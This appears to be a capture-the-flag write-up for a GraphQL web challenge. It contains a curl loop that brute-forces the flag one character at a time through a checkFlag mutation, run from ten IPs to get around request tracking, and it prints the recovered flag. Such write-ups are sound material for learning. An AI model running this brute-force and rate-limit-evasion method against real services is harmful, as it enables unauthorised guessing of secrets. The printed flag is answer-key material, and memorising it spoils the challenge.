# Stage 3 - querying - web - medium

## Challenge
In German, Graf means count. Anyway I'm certain he likes pie. Who doesn't? He also won't give you the Flag as he keeps track of every request. Nothing to see here, please move along. http://199.247.4.207:4000/

## Solution
For sure there is a better solution but bruteforce from 10 different IPs was good enough. Each server iterates over some portion of "a-zA-Z0-9_"
```
for c in 'a-zA-Z0-9_'; do
  echo ${c}
  curl -s 'http://199.247.4.207:4000/' \
      -H 'admin: 1' \
      -H 'Content-Type: application/json' \
      -H 'Accept: application/json' \
      -H 'Connection: keep-alive' \
      -H 'DNT: 1' \
      -H 'Origin: http://199.247.4.207:4000' \
      --data-binary '{"query":"# Write your query or mutation here\nmutation {\n  checkFlag(flag: \"junior-Batching_Qu3r1e5_is_FUN1'${c}'\")\n}"}'
      | jq '.data.checkFlag'
  echo ""
done
```
As soon `.data.checkFlag` reported correct character I was updating scripts and iterating again until full flag was recovered.

Even with a delay from server it's possible to recover the flag in below 30min.

## Links

## Flag
```
junior-Batching_Qu3r1e5_is_FUN1
```
